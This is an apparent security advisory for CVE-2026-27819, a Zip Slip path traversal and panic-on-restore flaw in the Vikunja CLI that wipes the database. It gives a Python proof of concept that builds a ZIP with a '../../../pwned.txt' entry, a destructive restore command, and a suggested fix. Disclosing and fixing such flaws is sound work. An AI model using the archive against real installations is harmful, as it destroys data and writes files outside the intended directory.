# Vikunja has Path Traversal in CLI Restore

**GHSA**: GHSA-42wg-38gx-85rh | **CVE**: CVE-2026-27819 | **Severity**: high (CVSS 7.2)

**CWE**: CWE-22, CWE-248

**Affected Packages**:
- **code.vikunja.io/api** (go): <= 0.24.6

## Description

### Summary

Path Traversal (Zip Slip) and Denial of Service (DoS) vulnerability discovered in the Vikunja CLI's restore functionality.

### Details

The restoreConfig function in vikunja/pkg/modules/dump/restore.go of the https://github.com/go-vikunja/vikunja/tree/main repository fails to sanitize file paths within the provided ZIP archive. A maliciously crafted ZIP can bypass the intended extraction directory to overwrite arbitrary files on the host system. Additionally, we’ve discovered that a malformed archive triggers a runtime panic, crashing the process immediately after the database has been wiped permanently.

The application trusts the metadata in the ZIP archive. It uses the Name attribute of the zip.File struct directly in os.OpenFile calls without validation, allowing files to be written outside the intended directory.

The restoration logic assumes a specific directory structure within the ZIP. When provided with a "minimalist" malicious ZIP, the application fails to validate the length of slices derived from the archive contents. Specifically, at line 154, the code attempts to access an index of len(ms)-2 on an insufficiently populated slice, triggering a panic.

### PoC

When provided with a ZIP containing a traversal path (e.g., ../../../pwned.txt) and a missing migration structure, the application wipes the existing database and then panics due to unsafe index manipulation at line 154 of restore.go.

Reproduction Steps:
1. Preparation: Generate vikunja_critical_poc.zip.
2. Execution: Run echo "Yes, I understand" | vikunja restore vikunja_critical_poc.zip.
3. Observation:
a. The application logs INFO: Wiped database.
b. The application immediately follows with: panic: runtime error: index out of range [-2].
4. The database is effectively deleted (Wiped), and the restoration process fails to complete, leaving the application in a non-functional state with total data loss for that instance.

Reproduction Python Script:

    import zipfile

    VIKUNJA_VERSION = "v1.1.0" 
    ZIP_NAME = "vikunja_critical_poc.zip"

    def create_poc():
        with zipfile.ZipFile(ZIP_NAME, 'w') as zipf:
            # Mandatory version file to pass initial check
            zipf.writestr('VERSION', VIKUNJA_VERSION)

            # Malicious traversal path
            # This triggers the traversal logic and the index panic simultaneously
            zipf.writestr('../../../pwned.txt', "Vulnerability Confirmed.")
        print(f"[+] {ZIP_NAME} created.")

    if __name__ == "__main__":
        create_poc()


Stack Trace:
time=2026-02-21T23:07:22.707Z level=INFO msg="Wiped database." panic: runtime error: index out of range [-2] goroutine 1 [running]: code.vikunja.io/api/pkg/modules/dump.Restore(...) /go/src/code.vikunja.io/api/pkg/modules/dump/restore.go:154 +0x1085


Remediation:
Sanitize Paths: Use filepath.Base() to strip all directory information from ZIP entries before processing.
Implement Bounds Checking: Ensure slices have sufficient length before performing index arithmetic.

Proposed Fix for restore.go:

    // 1. Sanitize the filename
    filename := filepath.Base(configFile.Name)
    dstPath := filepath.Join(extractionDir, filename)

    // ...

    // 2. Prevent Index Out of Range Panic (Line 154)
    if len(ms) < 2 {
        return fmt.Errorf("invalid migration sequence in backup archive")
    }
    lastMigration := ms[len(ms)-2]

### Impact

Vulnerability Type: CWE-22 (Path Traversal) / CWE-248 (Uncaught Exception)
Affected Component: pkg/modules/dump/restore.go
Impact: Arbitrary File Write and Permanent Data Loss
Status: Vikunja has not found an existing CVE for these issues; they appear to be undisclosed Zero-Days.
Source File: pkg/modules/dump/restore.go
Functions: Restore, restoreConfig
Line Number: 154 (v1.1.0)
Command: vikunja restore <path_to_zip>

Affected Party: Any administrator or automated process utilizing the vikunja restore CLI command.
1. Specifically, instances where a user may be socially engineered into restoring a backup from an untrusted source are at high risk.
2. Additionally, because the database is wiped before archive validation, even a failed exploitation attempt results in a complete loss of application data for that instance, impacting all end-users of the affected Vikunja installation.
